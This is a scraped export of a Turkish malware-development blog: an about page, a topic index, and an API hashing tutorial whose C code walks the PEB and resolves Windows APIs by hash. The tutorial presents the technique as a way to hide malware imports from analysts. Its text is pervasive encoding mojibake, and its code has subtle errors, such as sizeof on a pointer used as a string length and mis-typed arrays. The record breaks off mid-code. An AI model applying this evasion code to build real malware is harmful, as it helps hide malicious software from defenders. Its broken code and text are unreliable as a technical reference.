{"/tr/about/":{"data":{"":"\nMerhabalar efenimm, bloguma hoÅŸ geldiniz! ğŸ‘‹\nBen Berkay ama genelde bekoo olarak biliniyorum. 19 yaÅŸÄ±ndayÄ±m ve son 4 yÄ±ldÄ±r kendimi siber gÃ¼venliÄŸe adamÄ±ÅŸ bir araÅŸtÄ±rmacÄ±yÄ±m. Ã–zellikle ÅŸu alanlarda yoÄŸunlaÅŸÄ±yorum:\nğŸ” Reverse Engineering\nğŸ› Malware Analysis\nâš™ï¸ Malware Development\nBloglarÄ±mÄ± ve dÃ¶kÃ¼manlarÄ±mÄ± hem TÃ¼rkÃ§e hem Ä°ngilizce hazÄ±rlÄ±yorum. Ä°ngilizce iÃ§erik zaten bolca bulunuyor ama TÃ¼rkÃ§e kaynaklarÄ±n kÄ±sÄ±tlÄ± olduÄŸunun farkÄ±ndayÄ±m. Bu yÃ¼zden elimden geldiÄŸince TÃ¼rkÃ§e iÃ§erik eklemeye, konularÄ± net ve anlaÅŸÄ±lÄ±r ÅŸekilde anlatmaya Ã¶zen gÃ¶steriyorum.\nğŸ“Œ Ã–nemli not: Buradaki hiÃ§bir iÃ§erik illegal amaÃ§ taÅŸÄ±mamaktadÄ±r ve okuyucuyu illegal aktivitelere teÅŸvik etmez. EÄŸer burada anlatÄ±lanlarÄ± gerÃ§ek senaryolarda uygularsanÄ±z, sorumluluk tamamen size aittir. AmacÄ±m sadece araÅŸtÄ±rma yapanlara kaynak saÄŸlamaktÄ±r.\nUmarÄ±m burada paylaÅŸtÄ±klarÄ±m iÅŸinize yarar. EÄŸer kafanÄ±za takÄ±lan bir konu olursa, yanlÄ±ÅŸ bilgi verdiÄŸimi dÃ¼ÅŸÃ¼nÃ¼rseniz veya sadece sohbet etmek isterseniz, bana yazmaktan Ã§ekinmeyin. SorularÄ±nÄ±zÄ± yanÄ±tlamak, yanlÄ±ÅŸÄ±mÄ± dÃ¼zeltmek ya da birlikte yeni ÅŸeyler Ã¶ÄŸrenmek benim iÃ§in bÃ¼yÃ¼k bir mutluluk olur.\nKeyifli okumalar ve bol araÅŸtÄ±rmalar dilerim! ğŸš€"},"title":"About"},"/tr/docs/":{"data":{"":"Bu sitede, dÃ¶kÃ¼manlar iÃ§in Ã¼Ã§ kategoride paylaÅŸÄ±m yapÄ±lmaktadÄ±r:\nMalware Development\rWindows Kernel Development\rUEFI Development"},"title":"Documentation"},"/tr/docs/malware-dev/":{"data":{"":"Malware Development ile ilgili konularÄ± incelemek iÃ§in aÅŸaÄŸÄ±daki bÃ¶lÃ¼mlere gÃ¶z atabilirsiniz:\nMalware Resurrection\rFile Spoofing\rAPI Hashing\rDirect Syscalls\rNTAPI Injection\rDLL Injection\rShellcode Injection"},"title":"Malware Development"},"/tr/docs/malware-dev/api-hashing/":{"data":{"":"","api-hashing-nedir#API Hashing Nedir?":"","apinin-adresini-bulma#APIâ€™nin Adresini Bulma":"","eat-export-address-table-ve-iat-import-address-table-nedir#EAT (Export Address Table) ve IAT (Import Address Table) Nedir?":"","modÃ¼lÃ¼n-base-addressini-bulma#ModÃ¼lÃ¼n Base Addressâ€™ini Bulma":"","pe-portable-executable-yapÄ±sÄ±-nedir#PE (Portable Executable) YapÄ±sÄ± Nedir?":"","references#References":"Merhabalar. Bu yazÄ±da, maldev alanÄ±ndaki API Hashing yÃ¶ntemini ele alacaÄŸÄ±m.\nPE (Portable Executable) YapÄ±sÄ± Nedir? Her ÅŸeyden Ã¶nce PE (Portable Executable) yapÄ±sÄ±nÄ± anlamanÄ±n gerekli olduÄŸunu dÃ¼ÅŸÃ¼nÃ¼yorum Ã§Ã¼nkÃ¼ bu tekniÄŸimiz tamamen bu yapÄ± Ã¼zerine.\nPE, Windows iÅŸletim sistemlerinde 32 ve 64 bit sÃ¼rÃ¼mlerde ve UEFI ortamlarda kullanÄ±lan executable dosyalar, object kodlar, DLLâ€™ler ve diÄŸerleri iÃ§in bir dosya biÃ§imidir. PE, Windows Ä°ÅŸletim sistemi loaderâ€™in yÃ¼rÃ¼tÃ¼lmek istenilen kodu yÃ¶netmesi iÃ§in gereken veri yapÄ±larÄ± iÃ§ermektedir.\nBir PE dosyasÄ±, dinamik linkerâ€™a (dynamic linker) yÃ¼rÃ¼tÃ¼lebilir dosyanÄ±n dosya belleÄŸin nasÄ±l eÅŸleceÄŸini ve Ã§alÄ±ÅŸtÄ±rÄ±lacaÄŸÄ±nÄ± belirten bir dizi baÅŸlÄ±k ve bÃ¶lÃ¼mden oluÅŸur. Bu baÅŸlÄ±klar ve bÃ¶lÃ¼mler, iÅŸletim sisteminin dosyayÄ± doÄŸru ÅŸekilde yÃ¼klemesine ve Ã§alÄ±ÅŸtÄ±rmasÄ±na olanak tanÄ±r.\nPE yapÄ±sÄ±nda bulunan bazÄ± Ã¶nemli baÅŸlÄ±klar ÅŸunlardÄ±r:\nDOS Header (IMAGE_DOS_HEADER): Bu baÅŸlÄ±k, eski MS-DOS iÅŸletim sistemleri tarafÄ±ndan yÃ¼rÃ¼tÃ¼lebilir dosyanÄ±n tanÄ±nmasÄ± iÃ§in gerekli minimum bilgileri iÃ§erir.\nDOS Stub: Bu, yÃ¼rÃ¼tÃ¼lebilir bir dosyanÄ±n baÅŸlangÄ±cÄ±nda bulunan ve DOS iÅŸletim sistemi tarafÄ±ndan tanÄ±nmasÄ± iÃ§in gereken minimum bilgileri iÃ§erir. Bu, dosyanÄ±n yÃ¼rÃ¼tÃ¼lebilir olup olmadÄ±ÄŸÄ±nÄ± belirlemek iÃ§in kullanÄ±lÄ±r.\nPE Header (IMAGE_NT_HEADERS): Bu baÅŸlÄ±k, PE formatÄ±na Ã¶zgÃ¼ Ã¶nemli bilgileri iÃ§erir. Ä°ÅŸletim sisteminin dosyayÄ± doÄŸru ÅŸekilde yÃ¼klemesi ve Ã§alÄ±ÅŸtÄ±rmasÄ± iÃ§in gerekli olan dosya boyutu, giriÅŸ noktasÄ± adresi, isteÄŸe baÄŸlÄ± DLLâ€™ler ve diÄŸer bilgiler buradadÄ±r.\nFile Header (IMAGE_FILE_HEADER): Bu baÅŸlÄ±k, dosyanÄ±n genel bilgilerini iÃ§erir. DosyanÄ±n mimarisi, dosya tÃ¼rÃ¼, bÃ¶lÃ¼mler ve diÄŸer bilgiler burada bulunur.\nOptional Header (IMAGE_OPTIONAL_HEADER): Bu baÅŸlÄ±k, dosyanÄ±n yÃ¼klenmesi ve Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ± iÃ§in gerekli olan bilgileri iÃ§erir. DosyanÄ±n mimarisi, dosya tÃ¼rÃ¼, bÃ¶lÃ¼mler ve diÄŸer bilgiler burada bulunur.\nEAT (Export Address Table) ve IAT (Import Address Table) Nedir? EAT ve IAT, PE dosyalarÄ±nda bulunan iki Ã¶nemli tablodur. Bu tablolar, dosyanÄ±n yÃ¼rÃ¼tÃ¼lmesi sÄ±rasÄ±nda iÅŸletim sistemi tarafÄ±ndan kullanÄ±lan fonksiyonlarÄ±n adreslerini ve adlarÄ±nÄ± iÃ§erir.\nEAT (Export Address Table): DÄ±ÅŸa AktarÄ±m Adres Tablosu olan EAT, bir PE dosyasÄ±nÄ±n dÄ±ÅŸarÄ± aktardÄ±ÄŸÄ± fonksiyonlarÄ±n adreslerini ve adlarÄ±nÄ± iÃ§eren bir tablodur. Bu tablo, dinamik linkerâ€™Ä±n (dynamic linker) yÃ¼rÃ¼tÃ¼lebilir dosyayÄ± yÃ¼klerken ve Ã§alÄ±ÅŸtÄ±rÄ±rken hangi fonksiyonlarÄ±n kullanÄ±labileceÄŸini belirlemesine yardÄ±mcÄ± olur. Bunu Ã¶zellikle aklÄ±nÄ±zda tutun Ã§Ã¼nkÃ¼ ileride bu tablo Ã¼zerinde iÅŸlem yapacaÄŸÄ±z.\nIAT (Import Address Table): Ä°Ã§e AktarÄ±m Adres Tablosu olan IAT, bir PE dosyasÄ±nÄ±n diÄŸer PE dosyalarÄ±ndan iÃ§e aktardÄ±ÄŸÄ± fonksiyonlarÄ±n adreslerini ve adlarÄ±nÄ± iÃ§eren bir tablodur. AynÄ± ÅŸekilde bu tabloda dinamik linkerâ€™Ä±n yÃ¼rÃ¼tÃ¼lebilir dosyayÄ± yÃ¼klerken ve Ã§alÄ±ÅŸtÄ±rÄ±rken hangi fonksiyonlarÄ±n iÃ§e aktarÄ±lmasÄ± gerektiÄŸini belirlemesine yardÄ±mcÄ± olur.\nAPI Hashing Nedir? API Hashing, bir API fonksiyonunun adÄ±nÄ± veya diÄŸer tanÄ±mlayÄ±cÄ± Ã¶zelliklerini bir hash deÄŸerine dÃ¶nÃ¼ÅŸtÃ¼ren bir tekniktir. Bu hash deÄŸeri, fonksiyonun kimliÄŸini temsil etmek iÃ§in kullanÄ±lÄ±r. APIâ€™larÄ±n adlarÄ±nÄ± ve adreslerini gizlemek iÃ§in kullanÄ±labilir.\nÃ–rneÄŸin, MessageBoxA fonksiyonunu iÃ§eren bir projeyi derleyip Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zÄ± dÃ¼ÅŸÃ¼nelim. Projemizde MessageBoxA kullandÄ±ÄŸÄ±mÄ±z iÃ§in derleme sÄ±rasÄ±nda derleyici (compiler), MessageBoxA APIâ€™sinin adresini Import Address Table (IAT) tablosuna ekleyecektir. Bu, programÄ± Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda MessageBoxA APIâ€™sinin bu adresten eriÅŸilebileceÄŸi anlamÄ±na gelir.\nAncak, MessageBoxAâ€™nÄ±n adresini gizlemek istiyorsak ne yapabiliriz? Ä°ÅŸte burada API hashing devreye girer. Malwareâ€™i analiz eden bir kiÅŸi, malwareâ€™da kullanÄ±lan APIâ€™larÄ± IAT iÃ§erisinde rahatlÄ±kla gÃ¶rebilir. Bu nedenle, projemizde bu APIâ€™lara farklÄ± isimler vererek ve ardÄ±ndan bu farklÄ± isimleri hashleyerek IATâ€™a eklersek, analiz eden kiÅŸi bu APIâ€™larÄ± kolayca gÃ¶remez. Temelde, API hashing yÃ¶ntemi budur: Ä°lgili APIâ€™nin adÄ±nÄ± deÄŸiÅŸtirip hashleyerek ve sonra IAT tablosuna ekleyerek gizlemek.\n#include \u003cstdio.h\u003e #include \u003cWindows.h\u003e DWORD CalculateHash(char* data) { DWORD hash = 0x99; for (size_t i = 0; i \u003c sizeof(data); i++) { hash += (hash * 0xab10f29f + data[i]) \u0026 0xffffff; } return hash; } int main() { DWORD hash_value = CalculateHash(\"CreateThread\"); printf(\"CreateThread: 0x%00x\\n\", hash_value); getchar(); return 0; } YukarÄ±daki Ã¶rnekte, verilen APIâ€™in hash deÄŸerini hesaplayan basit bir kod parÃ§asÄ± hazÄ±rlanmÄ±ÅŸtÄ±r. Ä°lk olarak APIâ€™nin adÄ± alÄ±nÄ±r ve hesap yapacak CalculateHash fonksiyonuna gÃ¶nderilir.\nFonksiyon iÃ§erisinde hash adÄ±nda ve 0x99 deÄŸer tutan bir DWORD deÄŸiÅŸkeni oluÅŸturduk. Bu deÄŸer, hesaplamanÄ±n baÅŸlangÄ±Ã§ â€‹â€‹noktasÄ± olarak kullandÄ±k.\nDaha sonra bir dÃ¶ngÃ¼ baÅŸlattÄ±k. Bu dÃ¶ngÃ¼de, mevcut hash deÄŸerini 0xab10f29f sabit deÄŸeri ile Ã§arpÄ±lÄ±r. Bu, her karakterin karma deÄŸerine katkÄ±sÄ±nÄ± artÄ±rmaya yardÄ±mcÄ± olur. Mevcut karakterin deÄŸeri, Ã§arpÄ±lan deÄŸere eklenir. Son olarak ise sonuÃ§, 0xffffff deÄŸeri ile bitsel AND iÅŸlemine tabi tutulur. Bu, karma deÄŸerinin 32 bitlik bir tamsayÄ± olarak kalmasÄ±nÄ± saÄŸlar. Bu basit bir projedir ve ilerdeki sÃ¼reÃ§lerde bu fonksiyonu kullanacaÄŸÄ±z.\nModÃ¼lÃ¼n Base Addressâ€™ini Bulma Åimdi, APIâ€™nin adresini bulma iÅŸlemine geÃ§eceÄŸiz. AdÄ±m adÄ±m WinDbg kullanarak, iÅŸlem modÃ¼llerini ve APIâ€™larÄ± nasÄ±l sÄ±ralandÄ±ÄŸÄ±nÄ± ve PE (Portable Executable) yapÄ±sÄ±nÄ± nasÄ±l gÃ¶rebileceÄŸimizi Ã¶ÄŸreneceÄŸiz. ArdÄ±ndan, bu bilgileri C projesine uygulayacaÄŸÄ±z.\nÄ°lk olarak, Ã§alÄ±ÅŸan bir iÅŸlemin PEB yapÄ±sÄ±nÄ± inceleyerek, iÅŸlemin modÃ¼llerinin taban adreslerine gÃ¶z atacaÄŸÄ±z. Belirtmek gerekirse, PEB, bir iÅŸlemin Ã§alÄ±ÅŸma zamanÄ± bilgilerini iÃ§eren bir yapÄ±dÄ±r. Bu yapÄ±, iÅŸlemin modÃ¼llerinin taban adreslerini, heap ve stack bilgilerini, Ã§evresel deÄŸiÅŸkenlerini ve diÄŸer bilgileri iÃ§erir.\n64 bit iÅŸlemlerde, PEB, Thread Environment Block bloÄŸundan 0x60 ofsette bulunur. TEB, yÃ¼rÃ¼tÃ¼len iÅŸ parÃ§acÄ±ÄŸÄ±nÄ±n Ã§alÄ±ÅŸma zamanÄ± bilgilerini iÃ§eren bir yapÄ±dÄ±r. TEB yapÄ±sÄ±, GS segment kaydÄ± tarafÄ±ndan iÅŸaretlenir. DolayÄ±sÄ±yla, PEB yapÄ±sÄ±na GS segment kaydÄ± ile GS:[0x60] adresinden eriÅŸilebilir.\nÅimdi, cmd.exeâ€™yi Ã§alÄ±ÅŸtÄ±ralÄ±m ve WinDbg kullanarak analize baÅŸlayalÄ±m:\nÄ°lk olarak dt komutu ile TEBâ€™in yapÄ±sÄ±nÄ± inceleyerek baÅŸlayabiliriz:\nBurada dikkatimizi Ã§eken kÄ±sÄ±m +0x060 ProcessEnvironmentBlock : 0x000000fc4bacf000 _PEBolmasÄ± yeterlidir. YukarÄ±da TEB ve PEBâ€™ten bahsetmiÅŸtik ve burada TEB iÃ§erisinde PEBâ€™in adresini gÃ¶rmekteyiz. Åimdi ise bu PEBâ€™in adresi ile bu yapÄ±ya bir gÃ¶z atalÄ±m:\nYakÄ±ndan ilgili processâ€™in PEB yapÄ±sÄ±nÄ± bÃ¶ylece gÃ¶rmÃ¼ÅŸ olduk. Burada bizi ilgilendiren kÄ±sÄ±m +0x018 Ldr: 0x00007ffe`c5c153e0 _PEB_LDR_DATA olacaktÄ±r. Bu yapÄ±, yÃ¼klenen modÃ¼llerin listesini iÃ§erir. Åimdi ise bu yapÄ±ya bir gÃ¶z atalÄ±m:\nBu yapÄ±ya gÃ¶z attÄ±ÄŸÄ±mÄ±zda Ã¼Ã§ farklÄ± liste olduÄŸunu gÃ¶rmekteyiz. Bu listeler, yÃ¼klenen modÃ¼llerin listesini temsil eder. Bu listelerin iÃ§erisinde bulunan yapÄ±lar ise LDR_DATA_TABLE_ENTRY yapÄ±sÄ±na aittir. Bu yapÄ±, yÃ¼klenen modÃ¼lÃ¼n bilgilerini iÃ§erir.\nBu listeleri tanÄ±madan Ã¶nce LIST_ENTRY yapÄ±larÄ±nÄ± anlamamiz lazÄ±m:\nFlink: Ä°lgili yapÄ±yÄ± iÅŸaret eden bir sonraki yapÄ±dÄ±r. Blink: Ä°lgili yapÄ±yÄ± iÅŸaret eden bir Ã¶nceki yapÄ±dÄ±r. Åimdi ise listeleri tanÄ±yalÄ±m:\nInLoadOrderModuleList: ModÃ¼llerin yÃ¼klenme sÄ±rasÄ±nÄ± temsil eder.\nInMemoryOrderModuleList: ModÃ¼llerin belleÄŸe yÃ¼klenme sÄ±rasÄ±nÄ± temsil eder.\nInInitializationOrderModuleList: ModÃ¼llerin baÅŸlatÄ±lma sÄ±rasÄ±nÄ± temsil eder.\nBu listelerden ana odaÄŸÄ±mÄ±z InLoaderOrderModuleList olacaktÄ±r. Bu listenin modÃ¼llerin yÃ¼klenme sÄ±rasÄ±nÄ± temsil ettiÄŸinden bahsetmiÅŸtik. Åimdi ise bu liste Ã¼zerinde iÅŸlem yaparak yÃ¼klenen modÃ¼lleri tek tek gÃ¶z atacaÄŸÄ±z.\nÄ°lk olarak InLoadOrderModuleList yapÄ±sÄ±ndaki 0x000002c0`f1e23690 adres, yÃ¼klenen ilk modÃ¼lÃ¼n adresidir. Bu adresi kullanarak ilk yÃ¼klenilen modÃ¼le gÃ¶z atabiliriz:\nÄ°lk yÃ¼klenen modÃ¼lÃ¼n detaylÄ± bilgilerini fotoÄŸrafta gÃ¶rÃ¼lebileceÄŸi Ã¼zere yakÄ±ndan gÃ¶rebiliyoruz. Ä°lk yÃ¼klenen modÃ¼l cmd.exe adÄ±yla ilgili executable dosyanÄ±n modÃ¼lÃ¼ olduÄŸunu gÃ¶rmekteyiz. Dllbase, ilgili modÃ¼lÃ¼n base addressini iÃ§erir. BaseDllName ise yÃ¼klenen modÃ¼lÃ¼n ismi. BunlarÄ± gÃ¶rmemiz yeterlidir araÅŸtÄ±rma iÃ§in.\nAraÅŸtÄ±rmalara devam etmek iÃ§in bir sonraki yÃ¼klenen modÃ¼le geÃ§ebiliriz:\nYÃ¼klenen diÄŸer modÃ¼lÃ¼n ntdll.dll olduÄŸunu gÃ¶rmekteyiz. Bu ÅŸekilde yÃ¼klenen tÃ¼m modÃ¼lleri tek tek inceleyebiliriz. Son olarak diÄŸer modÃ¼le de gÃ¶z atalÄ±m:\nDiÄŸer yÃ¼klenen modÃ¼le gÃ¶z attÄ±ÄŸÄ±mÄ±zda ise kernel32.dll olduÄŸunu gÃ¶rmekteyiz.\nÅimdi ise odaÄŸÄ±mÄ±zÄ± C projemize Ã§evireceÄŸiz. Bu Ã¶ÄŸrendiklerimizi ise C projesine dÃ¶keceÄŸiz.\nIDE iÃ§erisinde bu yapÄ±lar tanÄ±mlÄ± olmadÄ±ÄŸÄ± iÃ§in elle kendimiz tamamlamamÄ±z gerekmektedir. Åimdi ise kodlamaya geÃ§ebiliriz:\n#include \"utils.h\" DWORD CalculateHash(char* data) { DWORD hash = 0x99; for (size_t i = 0; i \u003c sizeof(data); i++) { hash += (hash * 0xab10f29f + data[i]) \u0026 0xffffff; } return hash; } DWORD CalcModuleHash(LDR_MODULE* ModuleLink) { char* ModuleName[64]; size_t counter = 0x0; while (ModuleLink-\u003eBaseDllName.Buffer[counter] \u0026\u0026 counter \u003c sizeof(ModuleName) - 1) { ModuleName[counter] = (char)ModuleLink-\u003eBaseDllName.Buffer[counter]; counter++; } ModuleName[counter++] = 0; return CalculateHash((char*)CharLowerA(ModuleName)); } HMODULE GetModuleBaseAddress(DWORD Hash) { HMODULE ModuleBaseAddress = NULL; INT_PTR PEB\t= __readgsqword(0x60);\t// PEB'in offseti INT_PTR LDR\t= 0x18;\t// PEB iÃ§erisindeki LDR'in offseti INT_PTR FlinkOffset\t= 0x10;\t// InLoadOrderModuleList'in offseti INT_PTR PEB_LDR_DATA = *(INT_PTR*)(PEB + LDR);\t// PEB iÃ§erisinden LDR'e ulaÅŸ INT_PTR FirstFlink = *(INT_PTR*)(PEB_LDR_DATA + FlinkOffset); // LDR iÃ§erisinden InLoadOrderModuleList yapÄ±sÄ±na ulaÅŸ LDR_MODULE* LDR_DATA_TABLE_ENTRY = (LDR_MODULE*)FirstFlink; do { /* Buradaki dÃ¶ngÃ¼, process'e yÃ¼klenen tÃ¼m modÃ¼l listesi Ã¼zerinde iÅŸlem yapar. YÃ¼klenen her modÃ¼lÃ¼n base address'i ve hash deÄŸeri alÄ±nÄ±r ve kontrol yapÄ±lÄ±r. */ LDR_DATA_TABLE_ENTRY = (LDR_MODULE*)LDR_DATA_TABLE_ENTRY-\u003eInLoadOrderModuleList.Flink; if (LDR_DATA_TABLE_ENTRY-\u003eBaseAddress != NULL) { if (CalcModuleHash(LDR_DATA_TABLE_ENTRY) == Hash) { break; } } } while (FirstFlink != (INT_PTR)LDR_DATA_TABLE_ENTRY); ModuleBaseAddress = (HMODULE)LDR_DATA_TABLE_ENTRY-\u003eBaseAddress; return ModuleBaseAddress; } Bu kod parÃ§asÄ±nda, Ã¶ncelikle CalculateHash fonksiyonu ile APIâ€™nin hash deÄŸeri hesaplanmaktadÄ±r. Daha sonra CalcModuleHash fonksiyonu, bir modÃ¼lÃ¼n ismini alÄ±r ve bu ismin hash deÄŸerini hesaplar. Ä°ÅŸlem sÄ±rasÄ±nda modÃ¼l ismi kÃ¼Ã§Ã¼k harfe dÃ¶nÃ¼ÅŸtÃ¼rÃ¼lÃ¼r ve her karakterin ASCII deÄŸeri ile Ã¶nceki hash deÄŸeri kullanÄ±larak yeni bir hash deÄŸeri hesaplanÄ±r.\nSon olarak, GetModuleBaseAddress fonksiyonu, verilen bir hash deÄŸeriyle eÅŸleÅŸen bir modÃ¼l bulur ve bu modÃ¼lÃ¼n baÅŸlangÄ±Ã§ adresini dÃ¶ndÃ¼rÃ¼r. Bunun iÃ§in, iÅŸlem yÃ¼klenen modÃ¼l listesi Ã¼zerinde dÃ¶ngÃ¼ yapar ve her bir modÃ¼lÃ¼n hash deÄŸeri CalcModuleHash ile hesaplanarak kontrol edilir. EÅŸleÅŸme bulunduÄŸunda, ilgili modÃ¼lÃ¼n baÅŸlangÄ±Ã§ adresi dÃ¶ndÃ¼rÃ¼lÃ¼r.\nAncak bu kod parÃ§asÄ±nÄ± kullanmamÄ±za gerek yok. Zaten bunlarÄ± yapan hazÄ±r APIâ€™lar bulunmaktadÄ±r.\nAPIâ€™nin Adresini Bulma Base Addressâ€™i bulduktan sonra APIâ€™in adresini bulmamÄ±z gerekiyor. Bunun iÃ§in ihtiyacÄ±mÄ±z olan ÅŸey, IMAGE_EXPORT_DIRECTORY yapÄ±sÄ±dÄ±r. Bu yapÄ±, Export Address Tableâ€™Ä±n (EAT) adresini iÃ§erir. Bu yapÄ±da iÃ§eren bazÄ± Ã¶nemli alanlar ÅŸunlardÄ±r:\nNumberOfFunctions: Export edilen fonksiyonlarÄ±n sayÄ±sÄ± AddressOfFunctions: Export edilen fonksiyonlarÄ±n adreslerinin bulunduÄŸu tablonun adresi AddressOfNames: Export edilen fonksiyonlarÄ±n isimlerinin bulunduÄŸu tablonun adresi Windbgâ€™a dÃ¶nelim ve ntdllâ€™in EAT tablosunu bularak baÅŸlayalÄ±m:\nntdllâ€™in yÃ¼klÃ¼ olduÄŸu adresin 00007ffe`c5a90000 olduÄŸunu gÃ¶rebiliyoruz. Åimdi bu adresten IMAGE_DOS_HEADER yapÄ±sÄ±na ulaÅŸalÄ±m:\nIMAGE_DOS_HEADER yapÄ±sÄ±nÄ±n adresini bulduktan sonra IMAGE_NT_HEADERS yapÄ±sÄ±na ulaÅŸacaÄŸÄ±z.\nBu yapÄ±nÄ±n adresini bulmak iÃ§in IMAGE_DOS_HEADER yapÄ±sÄ±nÄ±n e_lfanewâ€™in hex deÄŸeri, ntdllâ€™in adresine ekleyerek elde edebiliriz. BÃ¶ylece IMAGE_NT_HEADERS yapÄ±sÄ±na ulaÅŸabiliriz:\nDaha sonra araÅŸtÄ±rmamÄ±za _IMAGE_OPTIONAL_HEADER64â€™a (0x18) ulaÅŸarak devam edeceÄŸiz:\n0:004\u003e dt _IMAGE_OPTIONAL_HEADER64 00007ffe`c5a90000+0xe0+0x18\rntdll!_IMAGE_OPTIONAL_HEADER64\r+0x000 Magic : 0x20b\r+0x002 MajorLinkerVersion : 0xe ''\r+0x003 MinorLinkerVersion : 0x1e ''\r+0x004 SizeOfCode : 0x130000\r+0x008 SizeOfInitializedData : 0xe5000\r+0x00c SizeOfUninitializedData : 0\r+0x010 AddressOfEntryPoint : 0\r+0x014 BaseOfCode : 0x1000\r+0x018 ImageBase : 0x00007ff9`373b0000\r+0x020 SectionAlignment : 0x1000\r+0x024 FileAlignment : 0x1000\r+0x028 MajorOperatingSystemVersion : 0xa\r+0x02a MinorOperatingSystemVersion : 0\r+0x02c MajorImageVersion : 0xa\r+0x02e MinorImageVersion : 0\r+0x030 MajorSubsystemVersion : 0xa\r+0x032 MinorSubsystemVersion : 0\r+0x034 Win32VersionValue : 0\r+0x038 SizeOfImage : 0x216000\r+0x03c SizeOfHeaders : 0x1000\r+0x040 CheckSum : 0x21eed5\r+0x044 Subsystem : 3\r+0x046 DllCharacteristics : 0x4160\r+0x048 SizeOfStackReserve : 0x40000\r+0x050 SizeOfStackCommit : 0x1000\r+0x058 SizeOfHeapReserve : 0x100000\r+0x060 SizeOfHeapCommit : 0x1000\r+0x068 LoaderFlags : 0\r+0x06c NumberOfRvaAndSizes : 0x10\r+0x070 DataDirectory : [16] _IMAGE_DATA_DIRECTORY Dikkatimizi 0x70 offsetine yani IMAGE_DATA_DIRECTORY yapÄ±sÄ±na Ã§ekiyoruz. Bu yapÄ±, Export Address Tableâ€™Ä±n RVAâ€™sÄ± (Relative Virtual Address) gibi Import Address Table iÃ§in Ã¶nemli bilgileri tutar.\nIMAGE_EXPORT_DIRECTORY yapÄ±sÄ± ise ÅŸu ÅŸekildedir:\ntypedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD Name; DWORD Base; DWORD NumberOfFunctions; DWORD NumberOfNames; DWORD AddressOfFunctions; // RVA from base of image DWORD AddressOfNames; // RVA from base of image DWORD AddressOfNameOrdinals; // RVA from base of image } IMAGE_EXPORT_DIRECTORY, * PIMAGE_EXPORT_DIRECTORY; Åimdi ise bu bilgilerin Ä±ÅŸÄ±ÄŸÄ±nda APIâ€™in adresini bulmak iÃ§in C projemize aÅŸaÄŸÄ±daki kodu ekleyeyelim:\nPDWORD getFunctionAddressByHash(char* library, DWORD hash) { PDWORD functionAddress = (PDWORD)0; HMODULE libraryBase = LoadLibraryA(library); PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase; PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader-\u003ee_lfanew); DWORD_PTR exportDirectoryRVA = imageNTHeaders-\u003eOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress; PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA); // Export edilmiÅŸ fonksiyonlarla ilgili bilgiler iÃ§in RVA'larÄ± al PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory-\u003eAddressOfFunctions); PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory-\u003eAddressOfNames); PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory-\u003eAddressOfNameOrdinals); for (DWORD i = 0; i \u003c imageExportDirectory-\u003eNumberOfFunctions; i++) { DWORD functionNameRVA = addressOfNamesRVA[i]; DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA; char* functionName = (char*)functionNameVA; DWORD_PTR functionAddressRVA = 0; // AlÄ±nan Export fonksiyonun hash deÄŸerini hesapla DWORD functionNameHash = getHashFromString(functionName); // CreateThread bulunursa Adresini ekrana bastÄ±r ve main'e dÃ¶n if (functionNameHash == hash) { functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]]; functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA); printf(\"%s : 0x%x : %p\\n\", functionName, functionNameHash, functionAddress); return functionAddress; } } } Bu kod parÃ§asÄ±nda, getFunctionAddressByHash fonksiyonu, verilen bir hash deÄŸeriyle eÅŸleÅŸen bir APIâ€™nin adresini bulur ve dÃ¶ndÃ¼rÃ¼r. Bunun iÃ§in, verilen kÃ¼tÃ¼phane adÄ±nÄ± yÃ¼kler ve IMAGE_EXPORT_DIRECTORY yapÄ±sÄ±nÄ± kullanarak Export Address Tableâ€™Ä±n adresini alÄ±r.\nDaha sonra bu yapÄ±daki adresler kullanÄ±larak, Export edilen fonksiyonlarÄ±n adreslerinin bulunduÄŸu tablo ve isimlerin bulunduÄŸu tablo adresleri alÄ±nÄ±r. Daha sonra, bu tablolar Ã¼zerinde dÃ¶ngÃ¼ yaparak, her bir fonksiyonun adÄ±nÄ± ve hash deÄŸerini hesaplar. EÅŸleÅŸme bulunduÄŸunda, ilgili fonksiyonun adresi dÃ¶ndÃ¼rÃ¼lÃ¼r.\nKodun tamamÄ±nÄ± birleÅŸtirelim ve basitÃ§e CreateThread APIâ€™sini Ã§alÄ±ÅŸtÄ±ralÄ±m:\n#include \u003cstdio.h\u003e #include \u003cstring.h\u003e #include \u003cWindows.h\u003e typedef struct HANDLE(NTAPI* MyCreateThread)( LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId ); DWORD getHashFromString(char* string) { size_t stringLength = strnlen_s(string, 50); DWORD hash = 0x35; for (size_t i = 0; i \u003c stringLength; i++) { hash += (hash * 0xab10f29f + string[i]) \u0026 0xffffff; } return hash; } PDWORD getFunctionAddressByHash(char* library, DWORD hash) { PDWORD functionAddress = (PDWORD)0; HMODULE libraryBase = LoadLibraryA(library); PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase; PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader-\u003ee_lfanew); DWORD_PTR exportDirectoryRVA = imageNTHeaders-\u003eOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress; PIMAGE_EXPORT_DIRECTORY imageExportDirectory = 